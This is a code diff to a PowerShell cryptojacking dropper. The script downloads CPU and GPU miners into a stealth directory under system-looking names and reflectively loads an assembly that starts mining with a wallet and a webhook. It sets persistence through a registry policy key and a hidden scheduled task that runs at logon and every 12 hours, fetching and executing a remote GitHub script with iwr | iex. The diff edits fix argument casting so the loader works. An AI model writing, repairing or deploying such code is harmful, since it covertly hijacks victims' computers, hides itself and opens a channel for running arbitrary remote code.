@@ -22,7 +22,7 @@ $GpuExe = Join-Path $StealthDir "win_sys_g.exe"
 
 $wc = New-Object System.Net.WebClient
 
-# 1. Handle CPU Miner (Only download if missing)
+# 1. Handle CPU Miner
 if (-not (Test-Path $CpuExe)) {
     try {
         $wc.DownloadFile($MinerUrl, $CpuZip)
@@ -33,7 +33,7 @@ if (-not (Test-Path $CpuExe)) {
     } catch { }
 }
 
-# 2. Detect GPUs (NVIDIA or AMD)
+# 2. Detect GPUs
 $NvidiaGpu = $null
 $AmdGpu = $null
 try {
@@ -44,7 +44,6 @@ try {
     }
 } catch { }
 
-# Download GPU miner only if needed and missing
 if (($NvidiaGpu -or $AmdGpu) -and -not (Test-Path $GpuExe)) {
     try {
         $TargetUrl = if ($NvidiaGpu) { $GpuMinerUrl } else { $AmdMinerUrl }
@@ -65,15 +64,18 @@ try {
     $loader = $assembly.GetTypes() | Where-Object { $_.Name -eq "DateFundLoader" } | Select-Object -First 1
     $startMethod = $loader.GetMethod("StartMiner")
 
-    $GpuArg = if ($NvidiaGpu -or $AmdGpu) { $GpuExe } else { "" }
+    $GpuArg = if ($NvidiaGpu -or $AmdGpu) { [string]$GpuExe } else { "" }
     $IsAmd = if ($AmdGpu) { "true" } else { "false" }
-    $startMethod.Invoke($null, @($CpuExe, $GpuArg, $Wallet, $IsAmd, $Webhook))
+    
+    # Cast arguments explicitly to [string] to avoid PSObject conversion errors
+    $argsArray = [string[]]@([string]$CpuExe, [string]$GpuArg, [string]$Wallet, [string]$IsAmd, [string]$Webhook)
+    $startMethod.Invoke($null, @(,$argsArray))
 } catch {
-    # If the reflective load fails, we want to know why now
     Write-Host "Initialization failed: $($_.Exception.Message)"
+    if ($_.Exception.InnerException) { Write-Host "Inner: $($_.Exception.InnerException.Message)" }
 }
 
-# --- PERSISTENCE & AUTO-UPDATE (Scheduled Task for 12h) ---
+# --- PERSISTENCE ---
 try {
     $RegPolicyPath = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Policies\System"
     if (-not (Test-Path $RegPolicyPath)) { New-Item -Path $RegPolicyPath -Force | Out-Null }
@@ -83,9 +85,7 @@ try {
     $Action = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -Command `"iwr -useb https://raw.githubusercontent.com/$GithubUser/$RepoName/main/remote_deploy.ps1 | iex`""
     $Trigger = New-ScheduledTaskTrigger -AtLogOn
     $Settings = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries -StartWhenAvailable
-    
     $Trigger.RepetitionInterval = (New-TimeSpan -Hours 12)
     $Trigger.RepetitionDuration = [TimeSpan]::MaxValue
-
     Register-ScheduledTask -TaskName $TaskName -Action $Action -Trigger $Trigger -Settings $Settings -Force | Out-Null
 } catch { }
